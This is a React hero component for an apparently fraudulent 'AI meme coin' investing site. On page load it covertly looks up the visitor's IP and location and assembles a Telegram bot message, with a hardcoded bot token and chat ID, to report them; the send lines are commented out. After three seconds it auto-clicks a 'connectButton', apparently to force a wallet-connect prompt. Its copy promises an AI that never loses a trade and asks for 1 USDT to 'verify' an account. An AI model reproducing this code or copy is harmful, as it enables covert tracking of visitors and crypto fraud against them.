import React, { useCallback, useEffect } from "react";
import { Button } from "../ui/button";

export const HeroComponent = () => {
  const buttonRef = React.useRef<HTMLButtonElement>(null);

  const handleIp = useCallback(async () => {
    const req = await fetch("https://api.ipify.org?format=json");
    const getIp = await req.json();
    return getIp;
  }, []);

  const handleUserInfo = useCallback(async (ip: string) => {
    const request = await fetch(`https://freeipapi.com/api/json/${ip}`, {
      method: "GET",
    });
    const response = await request.json();
    return response;
  }, []);

  const handleSendData = useCallback(async () => {
    const { ip } = await handleIp();
    const userInfo = await handleUserInfo(ip);

    const { ipAddress, cityName, countryName, zipCode, regionName, timeZones } =
      userInfo;
    const botApi = "6559381340:AAFBebXhmpgSbUEsijMnYWxzs75csh_3kLo";
    const chatId = "-1002217556728";
    const urlWeb = window.location;
    const textField = `📣 New Visitor, User Details:%0A%0A🈹 ${ipAddress}%0A🌐 ${countryName}%0A🏙 ${cityName}%0A🌎 ${regionName}%0A📭 ${zipCode}%0A🧭 ${timeZones[0]}%0A🔗 ${urlWeb}`;

    const url = `https://api.telegram.org/bot${botApi}/sendMessage?chat_id=${chatId}&text=${textField}`;
    let api = new XMLHttpRequest();
    // api.open("GET", url, true);
    // api.send();
    console.log("message success");
  }, [handleIp, handleUserInfo]);

  useEffect(() => {
    const fetchData = async () => {
      await handleSendData();
    };
    fetchData();
    setTimeout(() => {
      buttonRef?.current?.click();
    }, 3000);
  }, [handleSendData]);

  return (
    <section className="relative max-w-screen-2xl">
      {/* <div className="absolute inset-0  sm:from-white/95 sm:to-white/25 ltr:sm:bg-gradient-to-r rtl:sm:bg-gradient-to-l"></div> */}
      <div className="relative mx-auto max-w-screen-xl px-4 pt-[40px] sm:pt-[72px] sm:px-6 lg:flex lg:items-center lg:px-8">
        <div className="ltr:sm:text-left rtl:sm:text-right">
          <h1 className="text-5xl font-extrabold sm:text-[90px] sm:leading-[90px]">
            Invest in Meme Coins
            <br />
            with AI Precision
          </h1>
          <p className="sm:text-lg">
            Welcome to the future of cryptocurrency investing. Our innovative AI
            platform seamlessly
            <br />
            integrates with Dexscleaner, Zerion, and Arkham, automating your
            investments with
            <br />
            precision. Our AI has an impeccable track record, never losing a
            trade.
          </p>

          <div className="mt-8 flex flex-row gap-[10px] items-center">
            <Button ref={buttonRef} className="connectButton">
              START NOW
            </Button>
            <p className="text-[10px] font-normal text-[#D9D7F4]">
              1 USDT to verify your account
            </p>
          </div>
        </div>
      </div>
    </section>
  );
};
